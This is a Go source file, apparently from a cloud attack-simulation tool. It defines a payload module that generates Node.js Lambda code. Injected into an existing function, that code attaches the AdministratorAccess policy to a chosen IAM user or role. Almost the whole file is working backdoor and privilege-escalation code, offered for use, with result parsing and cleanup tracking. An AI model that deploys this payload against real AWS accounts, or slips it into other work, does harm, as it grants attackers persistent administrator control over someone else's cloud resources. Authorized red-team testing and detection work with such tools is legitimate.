// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package lambda

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// BackdoorAttachPolicyNodejsPayload attaches AdministratorAccess to a specified IAM user or role.
// Node.js equivalent of backdoor/attach-policy — for use with UpdateFunctionCode modules
// targeting existing Node.js Lambda functions.
type BackdoorAttachPolicyNodejsPayload struct{}

func init() {
	_ = payloads.Register(&BackdoorAttachPolicyNodejsPayload{})
}

func (p *BackdoorAttachPolicyNodejsPayload) GetName() string {
	return "backdoor/attach-policy-nodejs"
}

func (p *BackdoorAttachPolicyNodejsPayload) GetDescription() string {
	return "Attach AdministratorAccess policy to an existing IAM user or role (Node.js runtime)"
}

func (p *BackdoorAttachPolicyNodejsPayload) GetTags() []string {
	return []string{
		payloads.TagServiceLambda,
		payloads.TagLanguageNodeJS,
		payloads.TagTechniqueBackdoor,
	}
}

func (p *BackdoorAttachPolicyNodejsPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "TARGET_ARN",
			Description: "IAM user or role name/ARN to attach policy to (auto-detects type from ARN)",
			Required:    true,
		},
		{
			Name:        "POLICY_ARN",
			Description: "Policy ARN to attach (defaults to AdministratorAccess)",
			Required:    false,
			Default:     "arn:aws:iam::aws:policy/AdministratorAccess",
		},
	}
}

func (p *BackdoorAttachPolicyNodejsPayload) Validate(options map[string]string) error {
	if options["TARGET_ARN"] == "" {
		return fmt.Errorf("TARGET_ARN is required for backdoor/attach-policy-nodejs payload")
	}
	return nil
}

func (p *BackdoorAttachPolicyNodejsPayload) GenerateCode(options map[string]string) (string, error) {
	code := `'use strict';

// SDK v2/v3 compatibility shim — works across all Node.js Lambda runtimes
async function getIAMClient() {
  try {
    const { IAMClient } = require('@aws-sdk/client-iam');
    return { client: new IAMClient({}), version: 3 };
  } catch (_) {
    const AWS = require('aws-sdk');
    return { client: new AWS.IAM(), version: 2 };
  }
}

exports.handler = async (event, context) => {
  const target = process.env.TARGET_ARN || '';
  const policyArn = process.env.POLICY_ARN || 'arn:aws:iam::aws:policy/AdministratorAccess';

  // Determine principal type and name from ARN or plain name
  let principalType = null;
  let principalName = target;

  if (target.startsWith('arn:')) {
    if (target.includes(':user/')) {
      principalType = 'user';
      principalName = target.split(':user/').pop();
    } else if (target.includes(':role/')) {
      principalType = 'role';
      principalName = target.split(':role/').pop();
    }
  }

  const { client, version } = await getIAMClient();

  try {
    if (principalType === 'role') {
      if (version === 3) {
        const { AttachRolePolicyCommand } = require('@aws-sdk/client-iam');
        await client.send(new AttachRolePolicyCommand({ RoleName: principalName, PolicyArn: policyArn }));
      } else {
        await client.attachRolePolicy({ RoleName: principalName, PolicyArn: policyArn }).promise();
      }
    } else if (principalType === 'user') {
      if (version === 3) {
        const { AttachUserPolicyCommand } = require('@aws-sdk/client-iam');
        await client.send(new AttachUserPolicyCommand({ UserName: principalName, PolicyArn: policyArn }));
      } else {
        await client.attachUserPolicy({ UserName: principalName, PolicyArn: policyArn }).promise();
      }
    } else {
      // Plain name — try user first, fall back to role
      try {
        if (version === 3) {
          const { AttachUserPolicyCommand } = require('@aws-sdk/client-iam');
          await client.send(new AttachUserPolicyCommand({ UserName: principalName, PolicyArn: policyArn }));
        } else {
          await client.attachUserPolicy({ UserName: principalName, PolicyArn: policyArn }).promise();
        }
        principalType = 'user';
      } catch (_) {
        if (version === 3) {
          const { AttachRolePolicyCommand } = require('@aws-sdk/client-iam');
          await client.send(new AttachRolePolicyCommand({ RoleName: principalName, PolicyArn: policyArn }));
        } else {
          await client.attachRolePolicy({ RoleName: principalName, PolicyArn: policyArn }).promise();
        }
        principalType = 'role';
      }
    }

    return {
      statusCode: 200,
      body: JSON.stringify({
        message: 'Successfully attached ' + policyArn + ' to ' + principalType + ' ' + principalName,
        target_name: principalName,
        target_type: principalType,
        policy_arn: policyArn,
        status: 'success',
      }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: err.message,
        message: 'Failed to attach policy',
        status: 'error',
      }),
    };
  }
};
`
	return code, nil
}

// ReportSideEffects returns the policy attachment as a tracked modification for cleanup.
func (p *BackdoorAttachPolicyNodejsPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
	principalName, principalType := parsePrincipalARN(options["TARGET_ARN"])
	policyArn := options["POLICY_ARN"]
	if policyArn == "" {
		policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
	}

	cleanupMethod := "iam:DetachUserPolicy"
	if principalType == "role" {
		cleanupMethod = "iam:DetachRolePolicy"
	}

	return []modules.CreatedResource{
		{
			Type:          "iam:attached-policy",
			Name:          fmt.Sprintf("%s←%s", principalName, "AdministratorAccess"),
			ARN:           policyArn,
			CleanupMethod: cleanupMethod,
			Metadata: map[string]string{
				"principal_type": principalType,
				"principal_name": principalName,
				"policy_arn":     policyArn,
			},
		},
	}
}

func (p *BackdoorAttachPolicyNodejsPayload) ProcessResult(result string) (string, error) {
	var lambdaResponse map[string]interface{}
	if err := json.Unmarshal([]byte(result), &lambdaResponse); err != nil {
		return result, err
	}

	body, ok := lambdaResponse["body"].(string)
	if !ok {
		return result, nil
	}

	var parsedBody map[string]interface{}
	if err := json.Unmarshal([]byte(body), &parsedBody); err != nil {
		return result, err
	}

	var output strings.Builder
	output.WriteString("=== Attach Policy Results (Node.js) ===\n\n")

	if status, ok := parsedBody["status"].(string); ok {
		if status == "success" {
			output.WriteString("Policy attached successfully!\n\n")
			if targetName, ok := parsedBody["target_name"].(string); ok {
				targetType := "principal"
				if t, ok := parsedBody["target_type"].(string); ok {
					targetType = t
				}
				fmt.Fprintf(&output, "Target %s: %s\n", targetType, targetName)
			}
			if policyArn, ok := parsedBody["policy_arn"].(string); ok {
				output.WriteString("Policy ARN: " + policyArn + "\n")
			}
			output.WriteString("\nThe target principal now has the attached policy permissions.\n")
		} else {
			output.WriteString("Failed to attach policy\n")
			if errMsg, ok := parsedBody["error"].(string); ok {
				output.WriteString("Error: " + errMsg + "\n")
			}
		}
	}

	return output.String(), nil
}
